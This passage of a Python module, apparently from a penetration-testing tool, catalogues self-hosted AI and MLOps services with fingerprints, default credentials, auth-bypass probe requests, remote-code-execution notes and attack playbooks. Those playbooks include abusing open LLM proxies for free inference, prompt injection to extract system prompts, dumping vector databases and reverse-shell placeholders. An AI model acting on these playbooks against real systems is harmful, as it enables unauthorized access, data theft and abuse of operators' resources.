            "Custom node packs run arbitrary Python in-process.  Path-"
            "traversal CVEs in the /upload/image endpoint allow file "
            "writes to arbitrary host paths → escalate to RCE."),
        "next_steps": [
            "GET /object_info to map every available node.",
            "Open SEARCH CVE to find the current /upload path-traversal "
            "exploit + how to trigger code via a custom node pack.",
        ],
        "references": [
            "https://github.com/comfyanonymous/ComfyUI",
        ],
    },

    {
        "id": "comet",
        "name": "Comet ML",
        "category": "MLOps experiment tracking",
        "signatures": [
            "Comet ML",
            "comet-ml",
            "comet.com",
        ],
        "default_ports": [80, 443, 8085],
        "version_endpoint": "/api/version",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/version", "method": "GET",
             "label": "version",
             "expect": "200 with JSON"},
        ],
        "rce_vector": (
            "On-prem Comet servers store user-uploaded artifacts and "
            "pickled Python objects — same RCE pattern as MLflow / "
            "ClearML when an operator deserialises them."),
        "next_steps": [
            "Confirm via /api/version.",
            "Open SEARCH CVE.",
        ],
        "references": [
            "https://www.comet.com/docs/",
        ],
    },

    {
        "id": "continue_dev",
        "name": "Continue.dev (self-hosted backend)",
        "category": "Code-completion proxy / IDE assistant",
        "signatures": [
            "continuedev",
            "continue-server",
        ],
        "default_ports": [65432, 8000, 80, 443],
        "version_endpoint": "/health",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/health", "method": "GET",
             "label": "health",
             "expect": "200"},
            {"path": "/v1/models", "method": "GET",
             "label": "OpenAI-compat models",
             "expect": "200 with JSON model list"},
        ],
        "rce_vector": (
            "Self-hosted Continue backends often proxy to local LLMs "
            "with no auth — value is in inference abuse + leaked "
            "system prompts containing internal codebase context."),
        "next_steps": [
            "GET /v1/models → inference is open.",
            "Prompt-inject to extract system prompt / context.",
        ],
        "references": [
            "https://docs.continue.dev/",
        ],
    },

    {
        "id": "cvat",
        "name": "CVAT",
        "category": "Computer-vision annotation tool (Intel)",
        "signatures": [
            "CVAT",
            "Computer Vision Annotation Tool",
            "cvat-ui",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/api/server/about",
        "login_endpoint": "/api/auth/login",
        "default_creds": [
            ("admin", "admin"),
        ],
        "auth_bypass_probes": [
            {"path": "/api/server/about", "method": "GET",
             "label": "server info",
             "expect": "200 with JSON {version, name}"},
            {"path": "/api/users/self", "method": "GET",
             "label": "self info",
             "expect": "401 normally — 200 = auth bypass"},
        ],
        "rce_vector": (
            "Auto-annotation runs Python on the server side.  Custom "
            "function endpoints accept Python source — once admin, "
            "RCE is straightforward."),
        "next_steps": [
            "GET /api/server/about for version.",
            "Try admin/admin via /api/auth/login (default on docker-"
            "compose deploys).",
        ],
        "references": [
            "https://github.com/cvat-ai/cvat",
        ],
    },

    {
        "id": "haystack",
        "name": "Haystack (REST API)",
        "category": "RAG framework (deepset)",
        "signatures": [
            "Haystack",
            "deepset/haystack",
            "haystack-api",
        ],
        "default_ports": [8000, 80, 443],
        "version_endpoint": "/health",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/health", "method": "GET",
             "label": "health",
             "expect": "200"},
            {"path": "/openapi.json", "method": "GET",
             "label": "OpenAPI schema",
             "expect": "200 with full schema"},
        ],
        "rce_vector": (
            "Pipelines accept arbitrary YAML configuration.  Python-"
            "expression nodes evaluate user-provided code → RCE when "
            "the YAML upload path is open."),
        "next_steps": [
            "GET /openapi.json — see exposed pipeline endpoints.",
        ],
        "references": [
            "https://docs.haystack.deepset.ai/",
        ],
    },

    {
        "id": "kobold_cpp",
        "name": "KoboldCpp",
        "category": "Local LLM serving (KoboldCpp / LostRuins)",
        "signatures": [
            "KoboldCpp",
            "lostruins/koboldcpp",
        ],
        "default_ports": [5001, 80, 443],
        "version_endpoint": "/api/extra/version",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/extra/version", "method": "GET",
             "label": "version",
             "expect": "200 with JSON"},
            {"path": "/api/v1/info", "method": "GET",
             "label": "model info",
             "expect": "200 with JSON model metadata"},
        ],
        "rce_vector": (
            "Inference-only — no direct RCE.  Value: free inference, "
            "system prompt extraction, prompt injection."),
        "next_steps": [
            "GET /api/v1/info → confirms model + free inference.",
        ],
        "references": [
            "https://github.com/LostRuins/koboldcpp",
        ],
    },

    {
        "id": "kubeflow",
        "name": "Kubeflow (Central Dashboard)",
        "category": "MLOps platform on Kubernetes",
        "signatures": [
            "Kubeflow",
            "kubeflow-central-dashboard",
            "centraldashboard",
        ],
        "default_ports": [80, 443, 8080, 31380],
        "version_endpoint": "/dex/.well-known/openid-configuration",
        "login_endpoint": "/dex/auth",
        "default_creds": [
            ("user@example.com", "12341234"),
            ("admin@kubeflow.org", "12341234"),
        ],
        "auth_bypass_probes": [
            {"path": "/dex/.well-known/openid-configuration",
             "method": "GET",
             "label": "Dex OIDC config",
             "expect": "200 with JSON OIDC metadata"},
            {"path": "/centraldashboard", "method": "GET",
             "label": "central dashboard",
             "expect": "302 to /dex if auth required, 200 if open"},
        ],
        "rce_vector": (
            "Notebook servers spawned by Kubeflow are full Jupyter — "
            "see the Jupyter entry above for the RCE primitive once "
            "you reach a notebook pod."),
        "next_steps": [
            "Try the documented test creds from Kubeflow tutorials.",
            "Once in: spawn a notebook → terminal → kubectl auth "
            "can-i for further pivots.",
        ],
        "references": [
            "https://www.kubeflow.org/docs/",
        ],
    },

    {
        "id": "label_studio",
        "name": "Label Studio",
        "category": "Data labeling (HumanSignal)",
        "signatures": [
            "Label Studio",
            "labelstud.io",
            "heartexlabs",
            "humansignal",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/version",
        "login_endpoint": "/user/login",
        "default_creds": [
            ("admin@labelstud.io", "admin"),
        ],
        "auth_bypass_probes": [
            {"path": "/version", "method": "GET",
             "label": "version",
             "expect": "200 with JSON {release}"},
            {"path": "/api/version", "method": "GET",
             "label": "API version",
             "expect": "200 with JSON"},
        ],
        "rce_vector": (
            "ML backend integration runs arbitrary Python.  XML "
            "interface configuration has had multiple SSTI / XXE "
            "issues."),
        "next_steps": [
            "GET /version — confirms Label Studio build.",
            "Open SEARCH CVE — multiple CVEs in 1.x branch.",
        ],
        "references": [
            "https://labelstud.io/",
        ],
    },

    {
        "id": "litellm",
        "name": "LiteLLM Proxy",
        "category": "Multi-provider LLM proxy (BerriAI)",
        "signatures": [
            "LiteLLM",
            "BerriAI/litellm",
            "litellm-proxy",
        ],
        "default_ports": [4000, 8000, 80, 443],
        "version_endpoint": "/health",
        "login_endpoint": "/login",
        "default_creds": [
            ("admin", "sk-1234"),
        ],
        "auth_bypass_probes": [
            {"path": "/health", "method": "GET",
             "label": "health",
             "expect": "200 with JSON {healthy_endpoints}"},
            {"path": "/v1/models", "method": "GET",
             "label": "models list",
             "expect": "401 with master key required, OR 200 with "
                       "list = no master key configured"},
            {"path": "/key/info", "method": "GET",
             "label": "API key listing",
             "expect": "401 unless you have master key"},
        ],
        "rce_vector": (
            "Not a direct RCE target.  Value: proxy abuse for free "
            "inference against the operator's keys, key exfiltration "
            "via /key/info if master key is leaked."),
        "next_steps": [
            "GET /v1/models without auth — if 200, the proxy is fully "
            "open; route prompts through it for free.",
            "If master key required, search the bundle / env files for "
            "leaks.",
        ],
        "references": [
            "https://docs.litellm.ai/",
        ],
    },

    {
        "id": "llamaindex_server",
        "name": "LlamaIndex Server",
        "category": "RAG / agent framework (LlamaIndex)",
        "signatures": [
            "LlamaIndex",
            "llama-index",
            "llama_index",
        ],
        "default_ports": [8000, 80, 443],
        "version_endpoint": "/docs",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/docs", "method": "GET",
             "label": "OpenAPI docs UI",
             "expect": "200 with Swagger HTML"},
            {"path": "/openapi.json", "method": "GET",
             "label": "OpenAPI schema",
             "expect": "200 with full JSON schema"},
        ],
        "rce_vector": (
            "Code-execution tools in agent setups + pickle-loaded "
            "indexes → RCE.  SSRF in URL-loader nodes."),
        "next_steps": [
            "GET /openapi.json to enumerate tools / endpoints.",
        ],
        "references": [
            "https://docs.llamaindex.ai/",
        ],
    },

    {
        "id": "lm_studio",
        "name": "LM Studio (server mode)",
        "category": "Local LLM serving (LM Studio)",
        "signatures": [
            "LM Studio",
            "lmstudio.ai",
            "lm-studio",
        ],
        "default_ports": [1234, 80, 443],
        "version_endpoint": "/v1/models",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/models", "method": "GET",
             "label": "OpenAI-compat models",
             "expect": "200 with JSON {data}"},
        ],
        "rce_vector": (
            "Inference-only.  Same value as Ollama / vLLM — free "
            "inference, system-prompt extraction, possible "
            "exfiltration of fine-tune data."),
        "next_steps": [
            "GET /v1/models → free inference open.",
        ],
        "references": [
            "https://lmstudio.ai/docs/local-server",
        ],
    },

    {
        "id": "localai",
        "name": "LocalAI",
        "category": "Drop-in OpenAI-compatible local LLM server",
        "signatures": [
            "LocalAI",
            "go-skynet/LocalAI",
            "localai-api",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/v1/models",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/models", "method": "GET",
             "label": "OpenAI-compat models",
             "expect": "200 with JSON {data}"},
            {"path": "/readyz", "method": "GET",
             "label": "ready probe",
             "expect": "200"},
        ],
        "rce_vector": (
            "GalleryModelManager allows model installation from URLs.  "
            "Crafted manifest can write files outside the models "
            "directory → RCE through library overwrite."),
        "next_steps": [
            "GET /v1/models — inference open.",
            "Open SEARCH CVE for the running LocalAI version.",
        ],
        "references": [
            "https://localai.io/",
            "https://github.com/mudler/LocalAI",
        ],
    },

    {
        "id": "milvus",
        "name": "Milvus",
        "category": "Vector DB (Zilliz)",
        "signatures": [
            "Milvus",
            "milvusdb",
            "zilliz",
        ],
        "default_ports": [19530, 9091, 80],
        "version_endpoint": "/healthz",
        "login_endpoint": "",
        "default_creds": [
            ("root", "Milvus"),
        ],
        "auth_bypass_probes": [
            {"path": "/healthz", "method": "GET",
             "label": "health",
             "expect": "200"},
            {"path": "/metrics", "method": "GET",
             "label": "Prometheus metrics",
             "expect": "200 with full metrics dump"},
        ],
        "rce_vector": (
            "Default deploy has weak auth (root/Milvus).  Once "
            "authenticated to the gRPC service: list / read / write "
            "all collections, manipulate index segments."),
        "next_steps": [
            "GET /metrics — confirms Milvus + reveals collection "
            "names.",
            "Connect via pymilvus with default cred and dump "
            "collections.",
        ],
        "references": [
            "https://milvus.io/docs/",
        ],
    },

    {
        "id": "qdrant",
        "name": "Qdrant",
        "category": "Vector DB (Qdrant)",
        "signatures": [
            "Qdrant",
            "qdrant.tech",
            "qdrant-server",
        ],
        "default_ports": [6333, 6334, 80, 443],
        "version_endpoint": "/",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/", "method": "GET",
             "label": "root info",
             "expect": "200 with JSON {title:'qdrant - vector search'}"},
            {"path": "/collections", "method": "GET",
             "label": "list collections",
             "expect": "200 with JSON {result:{collections:[...]}}"},
            {"path": "/telemetry", "method": "GET",
             "label": "telemetry",
             "expect": "200 with detailed runtime info"},
        ],
        "rce_vector": (
            "No auth by default.  Read / write any collection.  Index "
            "snapshots can be uploaded — past CVEs around snapshot "
            "import path traversal."),
        "next_steps": [
            "GET /collections — list everything.",
            "Read points via /collections/<name>/points/scroll.",
        ],
        "references": [
            "https://qdrant.tech/documentation/",
        ],
    },

    {
        "id": "ragflow",
        "name": "RAGFlow",
        "category": "RAG platform (Infiniflow)",
        "signatures": [
            "RAGFlow",
            "infiniflow",
            "ragflow-server",
        ],
        "default_ports": [9380, 80, 443],
        "version_endpoint": "/v1/system/version",
        "login_endpoint": "/v1/user/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/system/version", "method": "GET",
             "label": "version",
             "expect": "200 with JSON"},
        ],
        "rce_vector": (
            "Document parsing pipeline runs Python on the server.  "
            "Crafted document with embedded macro / formula → RCE "
            "(historical CVEs).  SSRF in URL ingestion."),
        "next_steps": [
            "GET /v1/system/version.",
            "Open SEARCH CVE.",
        ],
        "references": [
            "https://github.com/infiniflow/ragflow",
        ],
    },

    {
        "id": "seldon_core",
        "name": "Seldon Core",
        "category": "K8s model serving (Seldon)",
        "signatures": [
            "Seldon Core",
            "seldon-core",
            "seldonio",
        ],
        "default_ports": [80, 443, 8000, 9000],
        "version_endpoint": "/api/v1.0/health/status",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/v1.0/health/status", "method": "GET",
             "label": "health",
             "expect": "200"},
            {"path": "/api/v1.0/predictions", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"data":{"ndarray":[[1,2]]}}',
             "label": "predictions endpoint",
             "expect": "200 with model output"},
        ],
        "rce_vector": (
            "Custom Python predictors accept user-controlled input.  "
            "Pickle deserialisation in model load path → RCE."),
        "next_steps": [
            "Confirm prediction endpoint reachable.",
        ],
        "references": [
            "https://docs.seldon.io/",
        ],
    },

    {
        "id": "sourcegraph_cody",
        "name": "Sourcegraph (Cody)",
        "category": "Self-hosted code intelligence + AI assistant",
        "signatures": [
            "Sourcegraph",
            "Cody",
            "sourcegraph-cody",
        ],
        "default_ports": [7080, 80, 443, 3080],
        "version_endpoint": "/__version",
        "login_endpoint": "/-/sign-in",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/__version", "method": "GET",
             "label": "version",
             "expect": "200 with semver"},
            {"path": "/.api/graphql", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"query":"{currentUser{username}}"}',
             "label": "GraphQL anonymous probe",
             "expect": "200 with JSON {data:{currentUser:null}} or "
                       "current user details if site is public"},
        ],
        "rce_vector": (
            "Search engine + Cody backend.  Past CVEs around SSRF in "
            "GraphQL resolvers, path traversal in batch changes UI, "
            "and SSO assertion injection."),
        "next_steps": [
            "GET /__version.",
            "POST GraphQL probe to test public-access mode.",
        ],
        "references": [
            "https://about.sourcegraph.com/docs",
        ],
    },

    {
        "id": "tabby",
        "name": "Tabby (TabbyML)",
        "category": "Self-hosted Copilot alternative",
        "signatures": [
            "TabbyML",
            "tabby-server",
            "tabbyml",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/v1/health",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/health", "method": "GET",
             "label": "health",
             "expect": "200 with JSON {model, device, ...}"},
            {"path": "/v1/completions", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"language":"python","segments":'
                     '{"prefix":"print("}}',
             "label": "free completion (no auth on default deploy)",
             "expect": "200 with completion = inference open"},
        ],
        "rce_vector": (
            "Inference proxy.  Value: code-completion abuse + leak of "
            "fine-tuned model data + system prompt extraction.  Past "
            "SSRF in webhook integrations."),
        "next_steps": [
            "GET /v1/health to confirm Tabby + see model.",
            "POST /v1/completions for free code generation.",
        ],
        "references": [
            "https://tabby.tabbyml.com/",
        ],
    },

    {
        "id": "text_generation_webui",
        "name": "text-generation-webui (oobabooga)",
        "category": "Local LLM UI (gradio)",
        "signatures": [
            "text-generation-webui",
            "oobabooga",
        ],
        "default_ports": [7860, 5000, 80, 443],
        "version_endpoint": "/v1/internal/model/info",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/internal/model/info", "method": "GET",
             "label": "loaded-model info",
             "expect": "200 with JSON"},
            {"path": "/v1/models", "method": "GET",
             "label": "OpenAI-compat models",
             "expect": "200 with JSON list"},
        ],
        "rce_vector": (
            "Custom 'extension' system loads arbitrary Python from the "
            "extensions/ directory.  When the API is wide open + the "
            "'sd_api_pictures' or similar code-exec extensions are "
            "enabled → RCE.  Past path-traversal in /file API."),
        "next_steps": [
            "Probe /v1/models for free inference.",
            "Open SEARCH CVE for path-traversal exploits.",
        ],
        "references": [
            "https://github.com/oobabooga/text-generation-webui",
        ],
    },

    {
        "id": "triton_inference",
        "name": "NVIDIA Triton Inference Server",
        "category": "Production model serving (NVIDIA)",
        "signatures": [
            "Triton Inference Server",
            "tritonserver",
            "nvidia/triton",
        ],
        "default_ports": [8000, 8001, 8002, 80, 443],
        "version_endpoint": "/v2",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v2", "method": "GET",
             "label": "KFServing root",
             "expect": "200 with JSON {name, version, extensions}"},
            {"path": "/v2/health/ready", "method": "GET",
             "label": "ready probe",
             "expect": "200 if server is ready"},
            {"path": "/v2/models/stats", "method": "GET",
             "label": "model stats (lists every model)",
             "expect": "200 with full JSON"},
        ],
        "rce_vector": (
            "Past CVEs around model-config path traversal during "
            "model load (CVE-2024-* family).  Custom Python backends "
            "execute attacker-influenced code if deployed without "
            "the strict-mode flag."),
        "next_steps": [
            "GET /v2/models/stats — list everything served.",
            "Open SEARCH CVE for CVE-2024-* triton + the running "
            "version.",
        ],
        "references": [
            "https://github.com/triton-inference-server/server",
        ],
    },

    {
        "id": "verba",
        "name": "Verba",
        "category": "RAG / golden-retriever (Weaviate)",
        "signatures": [
            "Verba",
            "weaviate/Verba",
            "verba-the-golden",
        ],
        "default_ports": [8000, 80, 443],
        "version_endpoint": "/api/health",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/health", "method": "GET",
             "label": "health",
             "expect": "200 with JSON"},
        ],
        "rce_vector": (
            "Document upload pipeline runs Python parsers — historical "
            "CVEs around path traversal + crafted-document RCE."),
        "next_steps": [
            "GET /api/health.",
            "Open SEARCH CVE for the version found.",
        ],
        "references": [
            "https://github.com/weaviate/Verba",
        ],
    },

    {
        "id": "wandb_local",
        "name": "Weights & Biases (W&B Local)",
        "category": "MLOps experiment tracking (on-prem)",
        "signatures": [
            "Weights & Biases",
            "wandb-local",
            "wandb-server",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/api/health",
        "login_endpoint": "/login",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/api/health", "method": "GET",
             "label": "health",
             "expect": "200"},
            {"path": "/api/graphql", "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "body": '{"query":"{viewer{id username}}"}',
             "label": "GraphQL viewer probe",
             "expect": "200 — viewer:null if unauth, otherwise leaks "
                       "your-side identity"},
        ],
        "rce_vector": (
            "Pickle artifacts loaded by `wandb.use_artifact` → RCE.  "
            "Past auth bypass advisories around the local server "
            "license-check routes."),
        "next_steps": [
            "POST GraphQL viewer probe.",
            "Open SEARCH CVE for the on-prem version.",
        ],
        "references": [
            "https://docs.wandb.ai/guides/hosting",
        ],
    },

    {
        "id": "weaviate",
        "name": "Weaviate",
        "category": "Vector DB (Weaviate)",
        "signatures": [
            "Weaviate",
            "semi-technologies/weaviate",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/v1/meta",
        "login_endpoint": "",
        "default_creds": [],
        "auth_bypass_probes": [
            {"path": "/v1/.well-known/ready", "method": "GET",
             "label": "ready probe",
             "expect": "200"},
            {"path": "/v1/meta", "method": "GET",
             "label": "metadata",
             "expect": "200 with JSON {hostname, modules, version}"},
            {"path": "/v1/schema", "method": "GET",
             "label": "schema dump (no auth on default)",
             "expect": "200 with full JSON schema = read access"},
        ],
        "rce_vector": (
            "Default deploy has anonymous-access enabled.  Read / "
            "write any class.  text2vec-* modules can be poisoned to "
            "redirect inference to an attacker-controlled provider."),
        "next_steps": [
            "GET /v1/schema — full read.",
            "Read objects via /v1/objects.",
        ],
        "references": [
            "https://weaviate.io/developers/weaviate",
        ],
    },

    {
        "id": "zenml",
        "name": "ZenML",
        "category": "MLOps pipeline framework",
        "signatures": [
            "ZenML",
            "zenml-server",
            "zenml.io",
        ],
        "default_ports": [8080, 80, 443],
        "version_endpoint": "/api/v1/info",
        "login_endpoint": "/api/v1/login",
        "default_creds": [
            ("default", ""),
        ],
        "auth_bypass_probes": [
            {"path": "/api/v1/info", "method": "GET",
             "label": "server info",
             "expect": "200 with JSON {version, deployment_type}"},
            {"path": "/api/v1/health", "method": "GET",
             "label": "health",
             "expect": "200"},
        ],
        "rce_vector": (
            "Pipelines load pickled steps + arbitrary Python.  Past "
            "auth-bypass CVEs around the FastAPI session middleware."),
        "next_steps": [
            "GET /api/v1/info to confirm.",
            "Open SEARCH CVE.",
        ],
        "references": [
            "https://docs.zenml.io/",
        ],
    },
]


# ── Lookup ────────────────────────────────────────────────────────────────

def match(title: str, description: str) -> list[dict]:
    """Return registry entries whose signatures match the finding's
    ``title + description`` blob (case-insensitive substring).  Each
    entry is returned at most once.
    """
    blob = f"{title or ''}\n{description or ''}".lower()
    out: list[dict] = []
    seen: set[str] = set()
    for entry in AIOPS_REGISTRY:
        if entry["id"] in seen:
            continue
        for sig in entry.get("signatures", []) or []:
            if sig.lower() in blob:
                out.append(entry)
                seen.add(entry["id"])
                break
    return out


# ── Rendering ────────────────────────────────────────────────────────────

def make_finding_title(entry: dict, *,
                        scheme: str, target: str,
                        port: "int | None") -> str:
    """Standardised AI-OPS finding title.

    Mirrors the scope-rich format the rest of HAWK uses (see
    target_intel_render._extract_web_target_label) so the merge-by-
    title in add_auto_finding behaves correctly: re-detect on the
    SAME url merges, re-detect on a different vhost / port lands as
    a separate card.
    """
    sch = (scheme or "http").lower()
    host = (target or "TARGET").lower()
    if port is None:
        port = 443 if sch == "https" else 80
    return f"AI Ops Target — {entry['name']} on {sch}://{host}:{port}/"


def render_finding_description(entry: dict, *,
                                scheme: str, target: str,
                                port: "int | None",
                                lhost: str = "{LHOST}",
                                lport: str = "{LPORT}") -> str:
    """Build the multi-line description shown in the Target Intel
    finding card.  ``{target}``, ``{scheme}``, ``{port}``,
    ``{LHOST}``, ``{LPORT}`` placeholders inside the entry's
    ``next_steps`` text are substituted; the operator can edit the
    last two before launching their reverse shell.

    NB: there is no `KNOWN CVEs` section anymore — CVE coverage is
    delegated to the `🔍 SEARCH CVE` button on the finding row,
    which opens Google / GitHub Advisories / ExploitDB / Packet
    Storm with the keyword `<tool> <version>` already filled in.
    Hardcoding CVE lists in the registry was producing false
    negatives within weeks of every patch — the live web search
    is always current and zero-maintenance.
    """
    sch = (scheme or "http").lower()
    host = (target or "TARGET").lower()
    if port is None:
        port = 443 if sch == "https" else 80
    base_url = f"{sch}://{host}:{port}"

    def _sub(text: str) -> str:
        return (text
                .replace("{target}", host)
                .replace("{scheme}", sch)
                .replace("{port}", str(port))
                .replace("{LHOST}", lhost)
                .replace("{LPORT}", lport))

    lines: list[str] = []
    lines.append(f"Detected: {entry['name']}  ·  {entry['category']}")
    lines.append(f"Source URL: {base_url}/")
    if entry.get("default_ports"):
        lines.append(
            f"Typical ports: "
            + ", ".join(str(p) for p in entry["default_ports"]))
    lines.append("")

    lines.append("─" * 50)
    lines.append("FINGERPRINT / VERSION:")
    if entry.get("version_endpoint"):
        lines.append(
            f"  curl -s {base_url}{entry['version_endpoint']}")
    lines.append("")

    lines.append("─" * 50)
    lines.append("SEARCH CVEs (click the 🔍 button on this row):")
    lines.append(
        f"  Opens Google / GitHub Security Advisories / ExploitDB /")
    lines.append(
        f"  Packet Storm in your browser, pre-filled with the keyword")
    lines.append(
        f"  '{entry['name']} <version>'.  Pick the public PoC and")
    lines.append(
        f"  adapt {{target}} / {{port}} / {{LHOST}} / {{LPORT}} to your scope.")
    lines.append("")

    if entry.get("default_creds"):
        lines.append("─" * 50)
        lines.append("DEFAULT CREDENTIALS to try first:")
        for u, p in entry["default_creds"]:
            disp_p = p if p else "<empty>"
            lines.append(f"  • {u} / {disp_p}")
        if entry.get("login_endpoint"):
            lines.append(
                f"  (POST {base_url}{entry['login_endpoint']} "
                f"with JSON body)")
        lines.append("")

    if entry.get("auth_bypass_probes"):
        lines.append("─" * 50)
        lines.append("AUTH BYPASS PROBES — click the 🤖 button below "
                     "to run them all:")
        for p in entry["auth_bypass_probes"]:
            lines.append(
                f"  • {p.get('method', 'GET')} {base_url}"
                f"{p.get('path', '/')}  —  "
                f"{p.get('label', '')}")
            if p.get("expect"):
                lines.append(f"      expect: {p['expect']}")
        lines.append("")

    if entry.get("rce_vector"):
        lines.append("─" * 50)
        lines.append("RCE VECTOR (post-auth, unless a bypass above "
                     "lands):")
        lines.append(f"  {entry['rce_vector']}")
        lines.append("")

    if entry.get("next_steps"):
        lines.append("─" * 50)
        lines.append("PLAYBOOK:")
        for i, step in enumerate(entry["next_steps"], 1):
            lines.append(f"  {i}. {_sub(step)}")
        lines.append("")

    if entry.get("references"):
        lines.append("─" * 50)
        lines.append("REFERENCES:")
        for ref in entry["references"]:
            lines.append(f"  {ref}")

    return "\n".join(lines).rstrip()


# ── Source-tag convention ────────────────────────────────────────────────
# Findings emitted by the AI-OPS hook carry this prefix so the
# correlation hook can guard against re-entry on its own emissions
# (mirrors the "HAWK CVE KB" prefix in target_intel_render).
SOURCE_PREFIX = "AI-OPS KB"


def make_source(entry: dict) -> str:
    return f"{SOURCE_PREFIX} ({entry.get('id', '?')})"


def is_aiops_source(source: str) -> bool:
    return (source or "").startswith(SOURCE_PREFIX)


# ── Web-search keyword for the SEARCH CVE button ────────────────────────

def search_keyword(entry: dict, version: str = "") -> str:
    """Build the keyword string the SEARCH CVE button passes to the
    picker (mode 3 → web search).  Empty or whitespace-only versions
    are dropped so the query is just the tool name.
    """
    name = (entry.get("name") or "").strip()
    ver = (version or "").strip()
    if not name:
        return ver
    if not ver:
        return name
    return f"{name} {ver}"
